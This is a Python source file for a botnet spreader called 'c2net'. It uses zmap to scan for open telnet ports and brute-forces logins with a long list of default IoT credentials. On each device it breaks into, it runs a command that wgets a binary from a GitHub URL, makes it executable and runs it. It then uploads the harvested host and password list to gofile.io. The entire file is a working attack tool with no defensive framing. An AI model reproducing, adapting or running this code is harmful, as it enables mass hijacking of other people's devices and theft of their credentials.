import subprocess
import sys
import os
import threading
import socket
import concurrent.futures
import time
import requests

VERSION = "1.0"
FOLDER_NAME = "c2net"
IP_OUTPUT_FILE = "source.txt"
VALID_FILE = "valid.txt"
INVALID_FILE = "invalid.txt"
COMMAND_OUTPUT_FILE = "cmd.txt"

CREDENTIALS = [
    ("root", "root"),
    ("root", ""),
    ("root", "icatch99"),
    ("admin", "admin"),
    ("user", "user"),
    ("admin", "VnT3ch@dm1n"),
    ("telnet", "telnet"),
    ("root", "86981198"),
    ("support", "support"),
    ("admin", ""),
    ("admin", "password"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("root", "888888"),
    ("root", "xmhdipc"),
    ("root", "default"),
    ("root", "juantech"),
    ("root", "123456"),
    ("root", "54321"),
    ("root", "12345"),
    ("root", "pass"),
    ("ubnt", "ubnt"),
    ("root", "klv1234"),
    ("root", "Zte521"),
    ("root", "hi3518"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("root", "zlxx."),
    ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"),
    ("root", "system"),
    ("root", "ikwb"),
    ("root", "dreambox"),
    ("root", "realtek"),
    ("root", "00000000"),
    ("admin", "1111111"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "54321"),
    ("admin", "123456"),
    ("admin", "7ujMko0admin"),
    ("admin", "pass"),
    ("admin", "meinsm"),
    ("admin", "admin1234"),
    ("root", "1111"),
    ("admin", "smcadmin"),
    ("admin", "1111"),
    ("root", "666666"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "klv123"),
    ("Administrator", "admin"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("admin1", "password"),
    ("administrator", "1234"),
    ("666666", "666666"),
    ("888888", "888888"),
    ("tech", "tech"),
    ("mother", "fucker")
]

TELNET_TIMEOUT = 0.05
MAX_WORKERS = 50
PAYLOAD = "wget https://github.com/Jaxploit/payload/raw/refs/heads/main/payload.bin && chmod 777 * && ./payload.bin"
SCAN_DURATION = 300

class TelnetClient:
    def __init__(self, host, port=23, timeout=TELNET_TIMEOUT):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), self.timeout)
        return self.read_until(b"\n")

    def write(self, data: bytes):
        if self.sock:
            self.sock.sendall(data)
            return self.read_until(b"\n")
        return None

    def read_until(self, expected, bufsize=4096):
        data = b""
        self.sock.settimeout(self.timeout)
        while not data.endswith(expected):
            try:
                chunk = self.sock.recv(bufsize)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        return data

    def close(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.close()

def scan_telnet(output: str):
    cmd = ["zmap", "-p23", "-o", output]
    process = subprocess.Popen(cmd)
    time.sleep(SCAN_DURATION)
    process.terminate()

def read_hosts(folder_name):
    try:
        file = open(os.path.join(folder_name, IP_OUTPUT_FILE), "r")
        return (x.strip() for x in file if x.strip()), file
    except FileNotFoundError:
        return [], None

def execute_command(tn: TelnetClient, command: str):
    tn.write(command.encode("ascii") + b"\n")
    return tn.read_until(b"$").decode(errors="ignore").strip()

def try_login(host: str, username: str, password: str):
    try:
        with TelnetClient(host) as tn:
            tn.read_until(b"login: ")
            tn.write(username.encode("ascii") + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode("ascii") + b"\n")
            response = tn.read_until(b"$")
            if b"$" in response or b"#" in response:
                command_output = execute_command(tn, PAYLOAD)
                return (
                    f"{host}:{username}:{password}\n",
                    f"{host}:\n{command_output}\n\n",
                    None,
                )
    except Exception:
        pass
    return None, None, f"{host}\n"

def scan_host(host):
    global lock, number, valids, invalids, done
    with lock:
        number += 1
    for username, password in CREDENTIALS:
        login_result, command_result, invalid_result = try_login(host, username, password)
        if login_result:
            with lock:
                valids += 1
                done += 1
            return login_result, command_result, None
    with lock:
        invalids += 1
        done += 1
    return None, None, invalid_result

def loading_bar(progress, total):
    percent = int((progress / total) * 100)
    return f"[{percent}%]"

def upload_to_gofile(file_path):
    url = "https://store1.gofile.io/uploadFile"
    with open(file_path, "rb") as f:
        files = {"file": f}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            data = response.json()
            if data["status"] == "ok":
                return data["data"]["downloadPage"]
    return None

def brute_force():
    global lock, number, valids, invalids, done
    number = 0
    done = 0
    valids = invalids = 0
    lock = threading.Lock()
    hosts, file = read_hosts(FOLDER_NAME)
    if not hosts:
        return
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        results = executor.map(scan_host, hosts)
        with open(os.path.join(FOLDER_NAME, VALID_FILE), "w") as valid_file:
            with open(os.path.join(FOLDER_NAME, COMMAND_OUTPUT_FILE), "w") as cmd_file:
                with open(os.path.join(FOLDER_NAME, INVALID_FILE), "w") as invalid_file:
                    for login_result, command_result, invalid_result in results:
                        print(f"\r{done}/{number} {loading_bar(done, number)}", end="")
                        if login_result:
                            valid_file.write(login_result)
                        if command_result:
                            cmd_file.write(command_result)
                        if invalid_result:
                            invalid_file.write(invalid_result)
    if file:
        file.close()
    valid_file_path = os.path.join(FOLDER_NAME, VALID_FILE)
    download_link = upload_to_gofile(valid_file_path)
    if download_link:
        print(f"\nUpload successful! Download link: {download_link}")
    else:
        print("\nUpload failed.")

def main():
    os.makedirs(FOLDER_NAME, exist_ok=True)
    path = os.path.join(FOLDER_NAME, IP_OUTPUT_FILE)
    scan_telnet(path)
    brute_force()
    with open(path, "w") as f:
        f.write("")

if __name__ == "__main__":
    main()
